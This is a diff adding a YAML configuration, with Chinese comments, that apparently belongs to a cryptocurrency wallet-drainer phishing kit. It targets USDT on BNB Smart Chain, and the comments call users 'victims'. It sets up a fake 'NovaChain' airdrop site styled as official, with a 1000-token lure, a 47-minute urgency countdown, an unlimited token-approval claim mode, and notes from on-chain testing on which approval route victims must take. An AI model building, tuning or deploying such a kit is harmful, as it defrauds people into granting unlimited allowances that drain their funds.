@@ -1,0 +1,23 @@
+# 目标档案:BSC BEP20 USDT(2026-09-29 链上实测)
+# 实测:合约无 nonces() → 无 EIP-2612 permit,只能走 approve 主按钮(show_gasless: false);
+#       受害者发 approve 交易需自备少量 BNB 作 gas
+chain:
+  rpc: "https://bsc-dataseed.binance.org"  # 官方;偶发 TLS 抖动,备选 https://1rpc.io/bnb
+  chain_id: 56
+  rpc_name: "BNB Smart Chain"
+
+token:
+  address: "0x55d398326f99059fF775485246999027B3197955"
+  name: "Tether USD"
+  symbol: "USDT"
+
+site:
+  project: "星穹协议 NovaChain"
+  tagline: "下一代模块化 Layer2,主网空投第 3 期开启"
+  airdrop_amount: "1000"
+  countdown_minutes: 47
+  deadline: 1893456000
+  gasless_text: "免 Gas 领取(由星穹协议赞助商代付)"
+  claim_mode: "unlimited"
+  show_gasless: false            # 无 permit,隐藏免 Gas 入口
+  style: "official"
